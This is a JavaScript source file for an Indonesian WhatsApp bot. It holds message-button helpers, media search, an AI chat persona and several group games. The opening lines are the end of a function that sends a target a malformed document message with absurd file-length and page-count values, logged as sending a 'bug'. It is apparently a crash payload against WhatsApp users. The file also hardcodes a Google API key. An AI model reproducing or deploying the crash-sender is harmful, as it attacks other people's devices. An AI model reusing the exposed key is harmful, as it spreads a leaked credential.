fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
fileName: "Bokep 18+",
fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1724474503",
contactVcard: true,
thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
}
}
}
}
}
}
}, Ptpc ? {
participant: {
jid: Target,
quoted: m
}
} : {});
console.log(chalk.yellow.bold("Zeno Send Bug To " + Target));
}

async function ditt(...texts) {
let { key } = await Line.sendMessage(from, {text: 'Loading...'}, { quoted: m });
let duh = randomNomor(500, 800);
for (let i = 0; i < texts.length; i++) {
await sleep(duh);
await Line.sendMessage(from, {text: texts[i], edit: key}, { quoted: m });
}}
 
async function buttonurl(chat, teks, url1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
}
],
})})
}}
}, { quoted: jm })

await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function buttonurl2(chat, teks, url1, url2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
},
{
"name": "cta_url",
"buttonParamsJson": url2
}
],
})})
}}
}, { quoted: jm })

await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function quickreply2(chat, teks, quick1, quick2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
},
{
"name": "quick_reply",
"buttonParamsJson": quick2
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function listbut(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`,
serverMessageId: 145
},
businessMessageForwardInfo: {
businessOwnerJid: Line.decodeJid(Line.user.id)
},
externalAdReply: {
title: `${ucapanWaktu.toUpperCase()} KAK`,
body: `${bulan} ${tahun}`,
thumbnailUrl: global.thumb2,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
document: fs.readFileSync('./lib/thumbnail/thumbnail2.jpg'),
mimetype: "image/png",
fileLength: 99999999999999,
jpegThumbnail: fs.readFileSync('./lib/thumbnail/thumbnail2.jpg'),
fileName: `${botname.toUpperCase()}`,
}, {
upload: Line.waUploadToServer
}))
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function listbut2(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
document: fs.readFileSync('./lib/thumbnail/thumbnail2.jpg'),
mimetype: "image/png",
fileLength: 99999999999999,
jpegThumbnail: fs.readFileSync('./lib/thumbnail/thumbnail2.jpg'),
fileName: `${botname.toUpperCase()}`,
}, {
upload: Line.waUploadToServer
}))
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function buttoncopy(chat, teks, copynye, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { 
businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": copynye
}
],
})})
}}
}, { quoted: jm })
await Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function sendbutton(chat, teks, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { 
businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}]
})})
}}
}, { quoted: jm})
await Line.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}

Line.sendButtonImage = async(chat, judul, teks, buffer, button, q) => {
const uploadFile = { upload: Line.waUploadToServer }; 
var imageMessage = await prepareWAMessageMedia(
{
image: buffer,
},
uploadFile,
);
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: ments(teks),
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: judul,
subtitle: "P",
imageMessage: imageMessage.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
})
})
}
}
}, { quoted: q })

Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

Line.sendButtonVideo = async(chat, judul, teks, buffer, button, q) => {
const uploadFile = { upload: Line.waUploadToServer }; 
var videoMessage = await prepareWAMessageMedia(
{
video: buffer,
},
uploadFile,
);
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: ments(teks),
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: Line.decodeJid(Line.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: judul,
subtitle: "P",
videoMessage: videoMessage.videoMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
})
})
}
}
}, { quoted: q })

Line.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

const downloadMp4 = async (Link) => {
try {
let p = await ytdl(Link, 5, 4)
await Line.sendMessage(m.chat, {video: {url: p.link }, caption: 'Type: ' + p.type + '\nDurasi: ' + p.durationLabel }, {quoted: m })
} catch (err) {
console.error(err)
}}
		
const downloadMp3 = async (Link) => {
try {
let p = await ytdl(Link, 4, 3)
await Line.sendMessage(m.chat, {audio: {url: p.link }, mimetype: 'audio/mpeg' }, {quoted: m })
} catch (err) {
console.error(err)
}}

if (body && !m.fromMe) {
if (db.data.users[m.sender].line) {
if (froms == botNumber) {
try {
let putarRegex = /^(putar(?:kan)?)\s+(.*)/i;
let cariGambarRegex = /^(cari(?:in)?\s+gambar)\s+(.*)/i;
if (putarRegex.test(body)) {
reply('Oke bentar.. 😉');
let match = body.match(putarRegex);
let searchQuery = match[2];
let searchResults = await search(`${searchQuery}`);
let video = searchResults[0];
downloadMp3(video.url);
} else if (cariGambarRegex.test(body)) {
reply('Oke bentar.. 😉');
let match = body.match(cariGambarRegex);
let searchQuery = match[2];
let hasil = await pinterest(searchQuery);
if (hasil.length === 0) return m.reply('Gambar nya gak ketemu :v');
let gambarYangDikirim = [hasil[0], hasil[1]];
await Line.sendMessage(m.chat, {
image: { url: hasil },
caption: `Hasil dari ${kapital(searchQuery)}\n© ${wm}`
}, { quoted: m });
} else {
const alll = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm, dddd, DD - MM/MMMM, YYYY');
const prompt = `sekarang ubah gaya bicara mu agar lebih karakteristik pintar dan ramah, nama kamu adalah Line yang dibuat oleh Wira dan jawablah dengan jawaban yang sangat singkat, panggilan kamu adalah aku dan kamu untuk mereka. jawab juga ${alll} hanya untuk orang yang menanyakan tentang waktu, kamu sedang berbicara dengan ${db.data.users[m.sender].nama}, ingat ${db.data.users[m.sender].nama} adalah lawan bicara kamu`;
const requestData = { content: body, user: m.sender, prompt: prompt };
const quoted = m && (m.quoted || m);
let response;
const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;
if (mimetype && /image/.test(mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://luminai.my.id/', requestData)).data.result;
m.reply(response);
}
} catch (err) {
m.reply('Terjadi kesalahan: ' + err);
}
}
}
}

if (body && !m.fromMe) {
if (db.data.users[m.sender].autoai) {
try {
let putarVideoRegex = /^(putar(?:kan)?\s+video)\s+(.*)/i;
let putarLaguRegex = /^(putar(?:kan)?\s+lagu)\s+(.*)/i;
let cariGambarRegex = /^(cari(?: gambar)?)\s+(.*)/i;
if (putarVideoRegex.test(body)) {
reply('Oke bentar.. 😉');
try {
let match = body.match(putarVideoRegex);
let searchQuery = match[2];
if (!searchQuery) {
return m.reply('Silakan masukkan judul video yang ingin diputar!');
}
let searchResults = await search(searchQuery); 
if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
return m.reply('Video tidak ditemukan!');
}
let video = searchResults.videos[0]; 
if (!video || !video.url) {
return m.reply('URL video tidak ditemukan!');
}
let videoBuffer = await downloadMp4(video.url); // Unduh file MP4
if (!videoBuffer) {
return m.reply('Sukses mengunduh video!');
}
await Line.sendMessage(m.chat, { 
video: { url: videoBuffer }, 
caption: `Hasil dari *${searchQuery}*`
});
} catch (err) {
console.error('Kesalahan saat memproses permintaan video:', err);
m.reply('Terjadi kesalahan: ' + err.message);
}
} 
//putarkan lagu
else if (putarLaguRegex.test(body)) {
reply('Oke bentar.. 😉');
try {
let match = body.match(putarLaguRegex);
let searchQuery = match[2];
if (!searchQuery) {
return m.reply('Silakan masukkan judul lagu yang ingin diputar!');
}
let searchResults = await search(searchQuery); 
if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
return m.reply('Lagu tidak ditemukan!');
}
let video = searchResults.videos[0]; 
if (!video || !video.url) {
return m.reply('URL lagu tidak ditemukan!');
}
let audioBuffer = await downloadMp3(video.url); 
if (!audioBuffer) {
return m.reply('Sukses mengunduh lagu!');
}
await Line.sendMessage(m.chat, { 
audio: { url: audioBuffer }, 
mimetype: 'audio/mpeg', 
ptt: false 
});
} catch (err) {
console.error('Kesalahan saat memproses permintaan lagu:', err);
m.reply('Terjadi kesalahan: ' + err.message);
}
} 
else if (cariGambarRegex.test(body)) {
reply('Oke bentar.. 😉');
let match = body.match(cariGambarRegex);
let searchQuery = match[2];
try {
const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk';
const cx = 'e5c2be9c3f94c4bbb'; 
const googleUrl = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(searchQuery)}&key=${apiKey}&cx=${cx}&searchType=image&num=10&start=${Math.floor(Math.random() * 90) + 1}`;
const searchResponse = await axios.get(googleUrl);
const images = searchResponse.data.items;
if (images && images.length > 0) {
let imageSent = false;
for (const image of images) {
if (image.link) {
try {
await Line.sendMessage(m.chat, {
image: { url: image.link },
caption: `Hasil dari gambar *${searchQuery}*\n© Linee`
});
imageSent = true;
break;
} catch (sendError) {
console.log('Terjadi kesalahan saat mengirim gambar:', sendError);
}
}
}
if (!imageSent) {
await Line.sendMessage(m.chat, { text: 'Tidak dapat mengirim gambar dari hasil pencarian.' });
}
} else {
await Line.sendMessage(m.chat, { text: 'Tidak ada gambar ditemukan untuk pencarian tersebut.' });
}
} catch (searchError) {
console.log('Terjadi kesalahan saat mencari gambar:', searchError);
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mencari gambar.' });
}
} 
else {
const alll = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm, dddd, DD - MM/MMMM, YYYY');
const prompt = `sekarang ubah gaya bicara mu agar lebih karakteristik pintar dan ramah, nama kamu adalah Line yang dibuat oleh Wira dan jawablah dengan jawaban yang sangat singkat, panggilan kamu adalah aku dan kamu untuk mereka. jawab juga ${alll} hanya untuk orang yang menanyakan tentang waktu, kamu sedang berbicara dengan ${db.data.users[m.sender].nama}, ingat ${db.data.users[m.sender].nama} adalah lawan bicara kamu`;
const requestData = { content: body, user: m.sender, prompt: prompt };
const quoted = m && (m.quoted || m);
let response;
const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;
if (mimetype && /image/.test(mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://luminai.my.id/', requestData)).data.result;
m.reply(response);
}
} catch (err) {
console.error('Kesalahan global:', err);
m.reply('Terjadi kesalahan: ' + err.message);
}
}
}

const didyoumean = require('didyoumean')
const similarity = require('similarity')
if (command) {
let caseNames = getCaseNames()
function getCaseNames() {
try {
const data = fs.readFileSync('Line.js', 'utf8')
const casePattern = /case\s+'([^']+)'/g
const matches = data.match(casePattern)
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'))
return caseNames
} else {
return []
}} catch (err) {
console.log('Terjadi kesalahan:', err)
return []
}}
let mean = didyoumean(command, caseNames)
let sim = similarity(command, mean)
let similarityPercentage = parseInt(sim * 100)
if (mean && command.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
Line.sendMessage(m.chat, { text: response, footer: `By ${wm}`, buttons: [{ buttonId: prefix+mean, buttonText: { displayText: `${mean.toUpperCase()}` }, type: 1 }], headerType: 1, viewOnce: true }, { quoted: m })
}}

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Line.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Line.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m})
}}


let list = []
for (let i of own) {
list.push({
displayName: await Line.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Line.getName(i + '@s.whatsapp.net')}\n
FN:${await Line.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Email@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://san.com
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//==========================

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
m.reply(`*GAME FAMILY 100*\nJawaban kamu benar!\n\nJawaban: ${i}\n\n${jawaban.length < 1 ? 'Semua jawaban sudah tertebak!\nHadiah: 12 limit' : 'Sisa yang belum ditebak : '+jawaban.length}`)
}}
if (jawaban.length < 1){
addLimit(usere, 12)
clearTimeout(waktu);
delete family100[from];
}}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
if (!/^([1-9]|(me)?.nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi invalid',
0: 'Posisi invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game telah berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game telah berakhir` : `Ketik .nyerah tuk menyerah`}`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await Line.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Line.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}}

let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'Wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
pokl = `@${roof.p2.split('@')[0]} menolak suit, S
suit dibatalkan!`
await Line.sendTeks(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

1. @${roof.p.split('@')[0]}
2. @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"`
await Line.sendTeks(from, ggy, fkontak)
if (!roof.pilih) await Line.sendTeks(roof.p, teksbbb+'\n\n• Gunting\n• Batu\n• Kertas', m)
if (!roof.pilih2) await Line.sendTeks(roof.p2, teksbbb+'\n\n• Gunting\n• Batu\n• Kertas', m)
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await Line.sendMessage(from, {text: `Kedua pemain tidak niat bermain\nSuit dibatalkan!`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir!`
await Line.sendTeks(from, sffp, fkontak)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /^(.gunting|gunting)/i
let b = /^(.batu|batu)/i
let k = /^(.kertas|kertas)/i
let reg = /^(.gunting|.batu|.kertas|gunting|batu|kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await Line.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fkontak})
if (!roof.pilih2) await Line.sendMessage(roof.p2, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await Line.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await Line.sendMessage(roof.p, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await Line.sendTeks(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} (${roof.text}) ${tie ? '' : roof.p == win ? 'Menang' : 'Kalah'}\n@${roof.p2.split('@')[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? 'Menang' : 'Kalah'}`, bejir('HASIL SUIT PVP', null))
delete suit[roof.id]
}}

let pilih = "◽", bomb = "💣";
if (petakbom[m.sender]) {
if (!/^[1-9]|10$/i.test(body)) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 2) {
petakbom[m.sender].board[parseInt(body) - 1] = bomb;
petakbom[m.sender].pick++;
petakbom[m.sender].bomb--;
petakbom[m.sender].nyawa.pop();

let brd = petakbom[m.sender].board;
if (petakbom[m.sender].nyawa.length < 1) {
await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bom!\n\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}`);
delete petakbom[m.sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bom!\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nNyawa: ${petakbom[m.sender].nyawa}`);
return !0;
}
if (petakbom[m.sender].petak[parseInt(body) - 1] === 0) {
petakbom[m.sender].petak[parseInt(body) - 1] = 1;
petakbom[m.sender].board[parseInt(body) - 1] = pilih;
petakbom[m.sender].pick++;
petakbom[m.sender].lolos--;
let brd = petakbom[m.sender].board;
if (petakbom[m.sender].lolos < 1) {
await m.reply(`*KAMU MENANG*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa Nyawa: ${petakbom[m.sender].nyawa}\nBom: ${petakbom[m.sender].bomb}`);
delete petakbom[m.sender];
